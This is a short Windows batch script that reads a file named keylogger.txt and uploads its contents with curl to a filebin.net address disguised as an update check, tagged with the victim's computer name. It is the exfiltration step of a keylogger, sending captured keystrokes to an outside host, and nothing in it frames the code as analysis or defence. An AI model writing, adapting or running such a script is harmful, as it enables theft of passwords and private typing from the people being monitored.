@echo off

set T=
SETLOCAL EnableDelayedExpansion
for /f "Tokens=* Delims=" %%x in (keylogger.txt) do set T=!T!#%%x

curl -X POST "https://filebin.net/checkingupdateseuganeo/%COMPUTERNAME%" -H  "accept: application/json" -H  "Content-Type: application/octet-stream" -d {"%T%"}